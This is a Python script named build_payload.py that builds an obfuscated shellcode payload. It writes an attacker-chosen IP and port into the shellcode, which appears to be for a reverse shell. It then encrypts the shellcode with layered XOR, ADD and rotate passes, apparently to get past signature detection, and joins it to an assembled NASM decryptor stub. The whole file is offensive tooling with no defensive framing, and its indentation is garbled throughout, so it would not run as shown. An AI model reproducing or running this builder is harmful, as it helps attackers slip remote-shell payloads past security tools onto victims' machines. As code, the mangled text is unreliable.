import subprocess
import sys
import struct

def patch_shellcode_ip_port(shellcode_bytes, ip, port, ip_offset, port_offset) :
    # Patch IP(4 bytes, network byte order)
    shellcode_bytes = bytearray(shellcode_bytes)
    shellcode_bytes[ip_offset:ip_offset + 4] = struct.pack("<I", ip)
    # Patch port(2 bytes, network byte order)
    shellcode_bytes[port_offset:port_offset + 2] = struct.pack("<H", port)
    return bytes(shellcode_bytes)

    def xor_encrypt(data, key) :
    return bytes(b ^ key for b in data)

    def add_encrypt(data, key) :
    return bytes((b + key) & 0xFF for b in data)

    def rol_encrypt(data, bits) :
    def rol_byte(b, bits) :
    return ((b << bits) | (b >> (8 - bits))) & 0xFF
    return bytes(rol_byte(b, bits) for b in data)

    def patch_decryptor_len(decryptor_source_path, patched_source_path, shellcode_len) :
    with open(decryptor_source_path, "r") as f :
lines = f.readlines()

with open(patched_source_path, "w") as f :
for line in lines :
if line.strip().startswith("shellcode_len equ") :
    f.write(f"shellcode_len equ {shellcode_len}\n")
else :
    f.write(line)

    def assemble_decryptor(source_path, output_path) :
    result = subprocess.run(["nasm", "-f", "bin", source_path, "-o", output_path], capture_output = True)
    if result.returncode != 0 :
        print("NASM assembly failed:")
        print(result.stderr.decode())
        sys.exit(1)

        def main() :
        if len(sys.argv) != 8 :
            print("Usage: python3 build_payload.py decryptor.asm shellcode.bin ip port ip_offset port_offset output.bin")
            print("Example IP: 127.0.0.1 as 0x7F000001")
            print("Port in network byte order, e.g. 4444 as 0x5c11")
            return

            decryptor_asm = sys.argv[1]
            shellcode_file = sys.argv[2]
            ip = int(sys.argv[3], 0)
            port = int(sys.argv[4], 0)
            ip_offset = int(sys.argv[5], 0)
            port_offset = int(sys.argv[6], 0)
            output_file = sys.argv[7]

            # Read shellcode
            with open(shellcode_file, "rb") as f :
shellcode = f.read()

# Patch IP and port
shellcode = patch_shellcode_ip_port(shellcode, ip, port, ip_offset, port_offset)

# Encrypt shellcode
shellcode = xor_encrypt(shellcode, 0xAA)
shellcode = add_encrypt(shellcode, 0x10)
shellcode = rol_encrypt(shellcode, 3)

# Patch decryptor source with shellcode length
patched_decryptor = "patched_decryptor.asm"
patch_decryptor_len(decryptor_asm, patched_decryptor, len(shellcode))

# Assemble decryptor
decryptor_bin = "decryptor.bin"
assemble_decryptor(patched_decryptor, decryptor_bin)

# Concatenate decryptor and encrypted shellcode
with open(decryptor_bin, "rb") as f :
decryptor_bytes = f.read()

with open(output_file, "wb") as f :
f.write(decryptor_bytes)
f.write(shellcode)

print(f"Final payload written to {output_file}")

if __name__ == "__main__":
main()
